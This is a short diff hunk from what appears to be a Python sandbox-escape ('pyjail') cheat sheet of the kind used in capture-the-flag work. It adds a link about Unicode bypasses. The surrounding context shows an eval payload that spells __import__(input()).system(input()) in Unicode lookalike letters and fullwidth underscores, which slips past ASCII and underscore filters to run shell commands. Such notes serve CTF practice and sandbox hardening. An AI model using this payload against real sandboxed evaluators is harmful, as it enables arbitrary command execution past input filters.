@@ -110,6 +110,8 @@ def a:pass # or class a:pass
 
 ```
 
+Other unicode bypasses: https://peps.python.org/pep-0672/
+
 ### no ASCII letters, no underscores, inside eval
 ```
 _＿𝘪𝘮𝘱𝘰𝘳𝘵＿_(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶𝘵())
